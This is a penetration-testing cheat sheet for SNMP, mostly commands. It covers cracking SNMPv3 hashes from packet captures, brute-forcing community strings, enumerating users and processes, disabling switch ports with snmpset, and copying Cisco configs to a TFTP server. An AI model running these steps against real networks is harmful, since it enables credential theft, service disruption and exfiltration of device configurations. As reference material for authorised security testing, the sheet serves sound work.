# SNMP

The fruit in SNMP can be easy to miss. Things to look out for.
1. Reading SNMP values may yield info such as processes that include usernames (new users to brute force), software versions (exploitdb) or even passwords (try the creds)
2. Writing SNMP values may allow a user to modify configurations of devices, such as changing TCP/IP info or disabling traffic flows (disable the port). This is more common on network infrastructure.
3. Custom devices may have corresponding custom MIBs. Be on the lookout for custom MIBs upon obtaining file system access. You may be surprised what you have control over.

The list below is ordered in convenience of my memory not order of operations during a penetration test

## Cracking SNMPv3
1. Convert pcap file to hashes
```
tshark -q -Xlua_script:network2john.lua -r selected.pcap
*Note: network2john is not a part of the default kali distro, however it is a part of the john github and/or parrotOS distro
```
2. Crack hash
```
john hashfile --wordlist=/opt/seclists/wordlist.txt

hashcat -m 25000 -a 0 <hashfile> <wordlist>
# Hashcat hash modes
25000 - SNMPv3 HMAC-MD5-96/HMAC-SHA1-96
25100 - SNMPv3 HMAC-MD5-96
25200 - SNMPv3 HMAC-SHA1-96
```

## Setting values
```
# Set ifAdminStatus (RFC1213) to admin shutdown port (need to add port value to MIB value)
snmpset -v3 -l authPriv -u User -a SHA -A AuthPass1 -x AES -X PrivPass2 x.x.x.x 1.3.6.1.2.1.2.2.1.7.x i 2
snmpset -v 2c -c public x.x.x.x 1.3.6.1.2.1.2.2.1.7.x i 2
```

## Discover community strings
```
# Metasploit
use auxiliary/scanner/snmp/snmp_login

# onesixtyone
onesixtyone -c <fullpathwordlist> <targetIP>

# nmap
nmap -sU -p 161 <targetIP> --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt
```

## View Values
```
# Collect info
snmpwalk -v 2c <targetIP> -c public
*Note: If you need to load MIBs comment out 4th line of /etc/snmp/snmp.conf

# List software installed
snmpwalk -c public -v1 <targetIP> hrSWInstalledName

# Metasploit
auxiliary/scanner/snmp/snmp_enum
```

## MIB values
```
# Microsoft MIB values
1.3.6.1.2.1.25.1.6.0 	System Processes 
1.3.6.1.2.1.25.4.2.1.2 	Running Programs 
1.3.6.1.2.1.25.4.2.1.4 	Processes Path 
1.3.6.1.2.1.25.2.3.1.4 	Storage Units 
1.3.6.1.2.1.25.6.3.1.2	 Software Name 
1.3.6.1.4.1.77.1.2.25 	User Accounts 
1.3.6.1.2.1.6.13.1.3   	TCP Local Ports 

# Cisco MIB values for copying a new running config (not tested)
1.) Set MIB values by name (Must have the Cisco MIBS: CISCO-SMI-V1SMI, SNMPv2-TC-V1SMI, CISCO-CONFIG-COPY-MIB-V1SMI,CISCO-FLASH-MIB-V1SMI)
snmpset -v 1 -c private <device name> ccCopyProtocol.<random number> integer 1 
ccCopySourceFileType.<Random number> integer 1 ccCopyDestFileType.<Random number> integer 3 ccCopyServerAddress.<Random number> ipaddress "<server ip address>" ccCopyFileName. <Random number> octetstring "<file name>" ccCopyEntryRowStatus.<Random number> integer 4  

2.) Enter Return and you see this output (111 is the random number in this example):

        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyProtocol.111 : INTEGER: tftp 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopySourceFileType.111 : INTEGER: networkFile 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyDestFileType.111 : INTEGER: startupConfig 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyServerAddress.111 : IpAddress: 172.17.246.205 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyFileName.111 : 
        DISPLAY STRING- (ascii):  foo-confg 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyEntryRowStatus.111 : INTEGER: createAndGo  

3.) Check the copy status to verify if the copy is successful.
snmpwalk <device name> ccCopyState 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyState.111 : INTEGER: running 

4.) Repeat step 3 until you see the status: successful.

        C:\>snmpwalk <device name> ccCopyState 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyState.111 : INTEGER: successful 

5.) Once you get the successful status, you can clear the row entry. In this example, the row is the <random number> that you chose previously.
snmpset -v 1 -c private <device name> ccCopyEntryRowStatus.111 integer 6 
        cisco.ciscoMgmt.ciscoConfigCopyMIB.ciscoConfigCopyMIBObjects.ccCopy.
        ccCopyTable.ccCopyEntry.ccCopyEntryRowStatus.111 : INTEGER: destroy 

# To copy config from device and transfer to tftp server complete steps 1-5 and make changes to the following values
ccCopySourceFileType.<Random number> integer 4 
ccCopyDestFileType.<Random number> integer 1 

# OID number example
1.) Set the values
snmpset -v 1 -c private <device name> .1.3.6.1.4.1.9.9.96.1.1.1.1.2.<Random number> integer 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.<Random number> integer 4 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.<Random number> integer 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.<Random number> ipaddress "<server ip address>" .1.3.6.1.4.1.9.9.96.1.1.1.1.6.<Random number> octetstring "<file name>" .1.3.6.1.4.1.9.9.96.1.1.1.1.14.<Random number> integer 4 
2.) Check the status
snmpwalk cognac .1.3.6.1.4.1.9.9.96.1.1.1.1.10

3.) Clear the row
snmpset -v 1 -c private <device name> .1.3.6.1.4.1.9.9.96.1.1.1.1.14.<Random number> integer 6 
```

## SNMP significant files
```
#Dump snmp Settings
reg query hklm\SOFTWARE\Policies\SNMP /s
reg query hklm\System\CurrentControlSet\Services\SNMP /s
```

## Resources
1. https://applied-risk.com/resources/brute-forcing-snmpv3-authentication
2. https://github.com/matrix/snmpv3brute
  *Note: Fork github of applied risk's that extracts to hashcat format
3. https://github.com/openwall/john
4. https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#app

## Miscellaneous
 ```
# Other tools
# download from http://dl.packetstormsecurity.net/UNIX/scanners/snmpenum.zip
# convert to unix
dos2unix.txt
#run
perl snmpenum.pl <targetIP> public windows.txt
```
